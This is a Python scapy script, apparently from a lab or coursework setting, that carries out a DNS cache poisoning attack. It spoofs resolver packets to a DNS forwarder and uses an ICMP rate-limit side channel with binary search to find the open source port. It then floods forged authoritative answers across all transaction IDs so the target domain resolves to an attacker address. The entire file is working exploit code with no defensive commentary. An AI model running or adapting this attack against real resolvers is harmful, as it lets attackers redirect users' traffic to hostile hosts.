#! /usr/bin/env python3

# -------------------------------------------------------------------------------
# Imports and Variables
# -------------------------------------------------------------------------------

from scapy.all import *
import threading
import time
from tqdm import tqdm

ATTACKER_IP = "69.69.69.2"
USER_IP = "69.69.69.3"
FORWARDER_IP = "69.69.69.4"
RESOLVER_IP = "69.69.69.5"
NAMESERVER_IP = "69.69.69.6"

PORT_MIN = 55000
PORT_MAX = 55050
FIXED_PORT = 55021

TARGET_DOMAIN = "g11dnscpar.com"
SOCKET = conf.L2socket(iface="enp0s3")

POISONED_REPLIES = []
PSEUDO_HEADER = None

QUERY_SENT = False
REPLY = None

# -------------------------------------------------------------------------------
# Classes and Functions
# -------------------------------------------------------------------------------


def create_poisoned_replies():
    global POISONED_REPLIES, PSEUDO_HEADER

    # Create the replies using scapy
    print("Initialising Poisoned DNS Replies")
    replies = []
    for id in tqdm(range(1024, 65536)):
        replies.append(
            Ether() /
            IP(dst=FORWARDER_IP, src=RESOLVER_IP) /
            UDP(sport=53, dport=0) /
            DNS(id=id, qr=1, qdcount=1, ancount=1, aa=1,
                qd=DNSQR(qname=TARGET_DOMAIN, qtype=0x0001,
                         qclass=0x0001),
                an=DNSRR(rrname=TARGET_DOMAIN, ttl=69420,
                         rdata="69.69.69.69"))
        )

    # Cast them into a bytearray for quicker transmission
    print("Casting Replies to Raw Bytearrays")
    for i in tqdm(range(0, len(replies))):
        POISONED_REPLIES.append(bytearray(raw(replies[i])))

    # Generate a pseudo header to patch the checksum later
    # The next 7 lines of code were copied from: https://blog.woefe.com/posts/faster_scapy.html
    PSEUDO_HEADER = struct.pack(
        "!4s4sHH",
        inet_pton(socket.AF_INET, replies[0]["IP"].src),
        inet_pton(socket.AF_INET, replies[0]["IP"].dst),
        socket.IPPROTO_UDP,
        len(POISONED_REPLIES[0][34:])
    )

    print("Poisoned DNS Replies Initialised\n")


def start_attack(iteration):
    print("<<>><<>><<>><<>><<>>Starting<>Iteration<>" +
          str(iteration) + "<<>><<>><<>><<>><<>>")

    # Initialise and start both threads
    thread_1 = threading.Thread(target=send_request, args=(1,))
    thread_1.start()

    thread_2 = threading.Thread(target=main_attack, args=(2,))
    thread_2.start()

    # Wait for both threads to finish
    thread_1.join()
    thread_2.join()

    print("<<>><<>><<>><<>><<>>Finished<>Iteration<>" +
          str(iteration) + "<<>><<>><<>><<>><<>>\n")

    # Posioning was successful
    if REPLY[DNS].ancount is not 0:
        return True
    else:
        return False


def send_request(id):
    global REPLY, QUERY_SENT
    # Create the DNS packet
    dns_packet = (
        IP(src=ATTACKER_IP, dst=FORWARDER_IP) /
        UDP(sport=6969, dport=53) /
        DNS(rd=1, qd=DNSQR(qname=TARGET_DOMAIN))
    )

    # Signal that the query is being sent
    QUERY_SENT = True

    # Send and store dns query
    REPLY = sr1(dns_packet, timeout=6000, verbose=True)


def main_attack(id):
    global QUERY_SENT

    # Wait for request to be sent
    while not QUERY_SENT:
        None

    print("Starting Main Attack Loop")

    while REPLY is None:
        port = infeer_source_port(PORT_MIN, 50)

        if port is not None:
            print("Found Likely Source Port: " + str(port))
            finished = brute_force_txid(port)

            if finished:
                return

        else:
            print("Could Not Discover Port, Restarting Loop")


def infeer_source_port(start_port, probing_packets_amount):

    # Generate probing packets
    packets = []
    for i in range(probing_packets_amount):
        packets.append(bytearray(raw(
            Ether() /
            IP(dst=FORWARDER_IP, src=RESOLVER_IP) /
            UDP(dport=(start_port+i), sport=RandShort())
        )))

    # Generate padding packets
    for i in range(50-probing_packets_amount):
        packets.append(bytearray(raw(
            Ether() /
            IP(dst=FORWARDER_IP, src=RESOLVER_IP) /
            UDP(dport=1, sport=RandShort())))
        )

    start_time = time.perf_counter()
    # Send the probing and padding packets packets
    for pkt in packets:
        SOCKET.send(pkt)

    probing_time = time.perf_counter()-start_time

    # Then send the verification packet to see if at least 1 port is open
    reply = SOCKET.sr1(
        Ether() /
        IP(dst=FORWARDER_IP) /
        UDP(dport=1, sport=RandShort()),
        timeout=0.5, verbose=False
    )

    # Wait for rate limit to reset
    if probing_time <= 0.02:
        time.sleep(0.02-probing_time)

    # No ports open in current range
    if reply == None:
        print("No Open Ports Found in Range")
        return None
    # At least one port open in current range
    elif reply.haslayer(ICMP):
        # If this happens we should have the actual port
        if probing_packets_amount == 1:
            return start_port

        print("At Least One Port Open in Range\n" +
              "Using Binary Search to Find Exact Port")

        # Binary division for bianry search
        new_amount, remainder = divmod(probing_packets_amount, 2)

        # Search left side of range
        print("Probing Left Side Using " + str(new_amount+remainder) +
              " Probing Packets, Starting at Port " + str(start_port))
        port = infeer_source_port(start_port, new_amount+remainder)

        # Search right side of range if port was not found on the left side
        if port == None:
            print("Probing Right Side Using " + str(new_amount) +
                  " Packets, Starting at Port " + str(start_port+new_amount))
            port = infeer_source_port(start_port+new_amount, new_amount)

        return port
    # Don't know how it would get here
    else:
        print("Something Has Gone Horribly Wrong")
        return None


def brute_force_txid(port):

    print("Brute Forcing Transaction IDs")

    for reply in POISONED_REPLIES:
        # Patch on the found port
        # Byte offset found using Wireshark
        # Code adpated from https://blog.woefe.com/posts/faster_scapy.html
        reply[36] = (port >> 8) & 0xFF
        reply[37] = port & 0xFF

        # Reset the checksum
        reply[40] = 0x00
        reply[41] = 0x00

        # Calculate new checksum
        check = checksum(PSEUDO_HEADER + reply[34:])
        if check == 0:
            check = 0xFFFF
        checks = struct.pack("!H", check)
        reply[40] = checks[0]
        reply[41] = checks[1]

        # Send the reply hopefully
        SOCKET.send(reply)

    return True


# -------------------------------------------------------------------------------
# Main Program
# -------------------------------------------------------------------------------

# Initialise the poisoned replies
create_poisoned_replies()

attack_successful = False
iteration = 1

while not attack_successful:

    success = start_attack(iteration)

    if success:
        attack_successful = success
    else:
        print("Iteration " + str(iteration) +
              " Unsuccessful, Reattempting Poisoning\n")
        QUERY_SENT = False
        REPLY = None
        iteration += 1

# Print poisoned reply
print(REPLY.show())
print("Poisoning Successful")
